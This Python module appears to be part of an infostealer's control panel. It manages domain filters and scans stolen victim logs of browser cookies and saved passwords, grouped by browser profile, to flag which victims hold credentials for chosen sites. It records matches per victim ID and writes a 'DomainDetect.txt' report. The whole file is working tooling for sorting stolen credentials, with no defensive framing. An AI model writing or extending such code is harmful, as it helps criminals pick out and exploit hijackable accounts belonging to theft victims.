import json
import sqlite3
from datetime import datetime
import re

class DomainFilterManager:
    def __init__(self, db_path="xillen_v5.db"):
        self.db_path = db_path
        self.init_database()
    
    def init_database(self):
        """Initialize database for domain filters"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        # Create domain filters table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS domain_filters (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                name TEXT NOT NULL,
                filter_type TEXT NOT NULL,
                domains TEXT NOT NULL,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                is_active BOOLEAN DEFAULT 1
            )
        ''')
        
        # Create domain detection results table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS domain_detections (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                log_id TEXT NOT NULL,
                filter_id INTEGER NOT NULL,
                detected_domains TEXT NOT NULL,
                detected_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (filter_id) REFERENCES domain_filters (id)
            )
        ''')
        
        conn.commit()
        conn.close()
    
    def create_filter(self, name, filter_type, domains):
        """Create a new domain filter"""
        try:
            # Validate filter type
            valid_types = ['cookies_creds', 'cookies', 'creds']
            if filter_type not in valid_types:
                return {
                    'status': 'error',
                    'message': f'Invalid filter type. Must be one of: {", ".join(valid_types)}'
                }
            
            # Validate domains
            domain_list = [domain.strip() for domain in domains.split(',') if domain.strip()]
            if not domain_list:
                return {
                    'status': 'error',
                    'message': 'At least one domain must be provided'
                }
            
            # Validate domain format
            domain_pattern = re.compile(
                r'^(?:[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.)*[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?$'
            )
            
            for domain in domain_list:
                if not domain_pattern.match(domain):
                    return {
                        'status': 'error',
                        'message': f'Invalid domain format: {domain}'
                    }
            
            # Save to database
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            cursor.execute('''
                INSERT INTO domain_filters (name, filter_type, domains)
                VALUES (?, ?, ?)
            ''', (name, filter_type, json.dumps(domain_list)))
            
            filter_id = cursor.lastrowid
            conn.commit()
            conn.close()
            
            return {
                'status': 'success',
                'filter_id': filter_id,
                'message': 'Filter created successfully'
            }
            
        except Exception as e:
            return {
                'status': 'error',
                'message': str(e)
            }
    
    def get_filters(self):
        """Get all domain filters"""
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            cursor.execute('''
                SELECT id, name, filter_type, domains, created_at, is_active
                FROM domain_filters
                ORDER BY created_at DESC
            ''')
            
            filters = []
            for row in cursor.fetchall():
                filters.append({
                    'id': row[0],
                    'name': row[1],
                    'filter_type': row[2],
                    'domains': json.loads(row[3]),
                    'created_at': row[4],
                    'is_active': bool(row[5])
                })
            
            conn.close()
            
            return {
                'status': 'success',
                'filters': filters
            }
            
        except Exception as e:
            return {
                'status': 'error',
                'message': str(e)
            }
    
    def update_filter(self, filter_id, name=None, filter_type=None, domains=None, is_active=None):
        """Update a domain filter"""
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            # Build update query dynamically
            updates = []
            params = []
            
            if name is not None:
                updates.append('name = ?')
                params.append(name)
            
            if filter_type is not None:
                if filter_type not in ['cookies_creds', 'cookies', 'creds']:
                    return {
                        'status': 'error',
                        'message': 'Invalid filter type'
                    }
                updates.append('filter_type = ?')
                params.append(filter_type)
            
            if domains is not None:
                domain_list = [domain.strip() for domain in domains.split(',') if domain.strip()]
                updates.append('domains = ?')
                params.append(json.dumps(domain_list))
            
            if is_active is not None:
                updates.append('is_active = ?')
                params.append(is_active)
            
            if not updates:
                return {
                    'status': 'error',
                    'message': 'No fields to update'
                }
            
            params.append(filter_id)
            
            query = f"UPDATE domain_filters SET {', '.join(updates)} WHERE id = ?"
            cursor.execute(query, params)
            
            conn.commit()
            conn.close()
            
            return {
                'status': 'success',
                'message': 'Filter updated successfully'
            }
            
        except Exception as e:
            return {
                'status': 'error',
                'message': str(e)
            }
    
    def delete_filter(self, filter_id):
        """Delete a domain filter"""
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            # Delete associated detections first
            cursor.execute('DELETE FROM domain_detections WHERE filter_id = ?', (filter_id,))
            
            # Delete the filter
            cursor.execute('DELETE FROM domain_filters WHERE id = ?', (filter_id,))
            
            conn.commit()
            conn.close()
            
            return {
                'status': 'success',
                'message': 'Filter deleted successfully'
            }
            
        except Exception as e:
            return {
                'status': 'error',
                'message': str(e)
            }
    
    def detect_domains_in_log(self, log_data):
        """Detect domains in log data using active filters"""
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            # Get active filters
            cursor.execute('''
                SELECT id, name, filter_type, domains
                FROM domain_filters
                WHERE is_active = 1
            ''')
            
            filters = cursor.fetchall()
            detections = []
            
            for filter_row in filters:
                filter_id, filter_name, filter_type, domains_json = filter_row
                domains = json.loads(domains_json)
                
                detected_domains = self._check_domains_in_data(log_data, domains, filter_type)
                
                if detected_domains:
                    # Save detection
                    cursor.execute('''
                        INSERT INTO domain_detections (log_id, filter_id, detected_domains)
                        VALUES (?, ?, ?)
                    ''', (log_data.get('victim_id', 'unknown'), filter_id, json.dumps(detected_domains)))
                    
                    detections.append({
                        'filter_name': filter_name,
                        'filter_type': filter_type,
                        'detected_domains': detected_domains
                    })
            
            conn.commit()
            conn.close()
            
            return {
                'status': 'success',
                'detections': detections
            }
            
        except Exception as e:
            return {
                'status': 'error',
                'message': str(e)
            }
    
    def _check_domains_in_data(self, log_data, domains, filter_type):
        """Check if any of the specified domains are present in the log data"""
        detected = []
        
        # Get relevant data based on filter type
        data_to_check = []
        
        if filter_type in ['cookies_creds', 'cookies']:
            # Check cookies data
            if 'cookies' in log_data:
                for browser, profiles in log_data['cookies'].items():
                    for profile, cookies in profiles.items():
                        for cookie in cookies:
                            if 'domain' in cookie:
                                data_to_check.append(cookie['domain'])
                            if 'url' in cookie:
                                data_to_check.append(cookie['url'])
        
        if filter_type in ['cookies_creds', 'creds']:
            # Check credentials data
            if 'passwords' in log_data:
                for browser, profiles in log_data['passwords'].items():
                    for profile, passwords in profiles.items():
                        for password in passwords:
                            if 'url' in password:
                                data_to_check.append(password['url'])
                            if 'origin_url' in password:
                                data_to_check.append(password['origin_url'])
        
        # Check for domain matches
        for domain in domains:
            for data_item in data_to_check:
                if domain.lower() in data_item.lower():
                    if domain not in detected:
                        detected.append(domain)
        
        return detected
    
    def get_detections_for_log(self, log_id):
        """Get all domain detections for a specific log"""
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            cursor.execute('''
                SELECT dd.id, df.name, df.filter_type, dd.detected_domains, dd.detected_at
                FROM domain_detections dd
                JOIN domain_filters df ON dd.filter_id = df.id
                WHERE dd.log_id = ?
                ORDER BY dd.detected_at DESC
            ''', (log_id,))
            
            detections = []
            for row in cursor.fetchall():
                detections.append({
                    'id': row[0],
                    'filter_name': row[1],
                    'filter_type': row[2],
                    'detected_domains': json.loads(row[3]),
                    'detected_at': row[4]
                })
            
            conn.close()
            
            return {
                'status': 'success',
                'detections': detections
            }
            
        except Exception as e:
            return {
                'status': 'error',
                'message': str(e)
            }
    
    def get_logs_by_filter(self, filter_id):
        """Get all logs that match a specific filter"""
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            cursor.execute('''
                SELECT DISTINCT dd.log_id, dd.detected_domains, dd.detected_at
                FROM domain_detections dd
                WHERE dd.filter_id = ?
                ORDER BY dd.detected_at DESC
            ''', (filter_id,))
            
            logs = []
            for row in cursor.fetchall():
                logs.append({
                    'log_id': row[0],
                    'detected_domains': json.loads(row[1]),
                    'detected_at': row[2]
                })
            
            conn.close()
            
            return {
                'status': 'success',
                'logs': logs
            }
            
        except Exception as e:
            return {
                'status': 'error',
                'message': str(e)
            }
    
    def generate_domain_detect_file(self, log_data, detections):
        """Generate DomainDetect.txt file content"""
        if not detections:
            return ""
        
        content = "=== DOMAIN DETECTION RESULTS ===\n\n"
        
        for detection in detections:
            content += f"Filter: {detection['filter_name']}\n"
            content += f"Type: {detection['filter_type']}\n"
            content += f"Detected Domains: {', '.join(detection['detected_domains'])}\n"
            content += "-" * 50 + "\n\n"
        
        return content
    
    def get_filter_statistics(self):
        """Get statistics about domain filters"""
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            # Total filters
            cursor.execute('SELECT COUNT(*) FROM domain_filters')
            total_filters = cursor.fetchone()[0]
            
            # Active filters
            cursor.execute('SELECT COUNT(*) FROM domain_filters WHERE is_active = 1')
            active_filters = cursor.fetchone()[0]
            
            # Total detections
            cursor.execute('SELECT COUNT(*) FROM domain_detections')
            total_detections = cursor.fetchone()[0]
            
            # Detections by filter type
            cursor.execute('''
                SELECT df.filter_type, COUNT(dd.id) as count
                FROM domain_filters df
                LEFT JOIN domain_detections dd ON df.id = dd.filter_id
                GROUP BY df.filter_type
            ''')
            
            detections_by_type = {}
            for row in cursor.fetchall():
                detections_by_type[row[0]] = row[1]
            
            conn.close()
            
            return {
                'status': 'success',
                'statistics': {
                    'total_filters': total_filters,
                    'active_filters': active_filters,
                    'total_detections': total_detections,
                    'detections_by_type': detections_by_type
                }
            }
            
        except Exception as e:
            return {
                'status': 'error',
                'message': str(e)
            }

# Global instance
domain_filter_manager = DomainFilterManager()

def create_domain_filter(name, filter_type, domains):
    """Create a new domain filter"""
    return domain_filter_manager.create_filter(name, filter_type, domains)

def get_domain_filters():
    """Get all domain filters"""
    return domain_filter_manager.get_filters()

def update_domain_filter(filter_id, **kwargs):
    """Update a domain filter"""
    return domain_filter_manager.update_filter(filter_id, **kwargs)

def delete_domain_filter(filter_id):
    """Delete a domain filter"""
    return domain_filter_manager.delete_filter(filter_id)

def detect_domains_in_log(log_data):
    """Detect domains in log data"""
    return domain_filter_manager.detect_domains_in_log(log_data)

def get_detections_for_log(log_id):
    """Get detections for a specific log"""
    return domain_filter_manager.get_detections_for_log(log_id)

def get_logs_by_filter(filter_id):
    """Get logs by filter"""
    return domain_filter_manager.get_logs_by_filter(filter_id)

def generate_domain_detect_file(log_data, detections):
    """Generate domain detect file"""
    return domain_filter_manager.generate_domain_detect_file(log_data, detections)

def get_filter_statistics():
    """Get filter statistics"""
    return domain_filter_manager.get_filter_statistics()
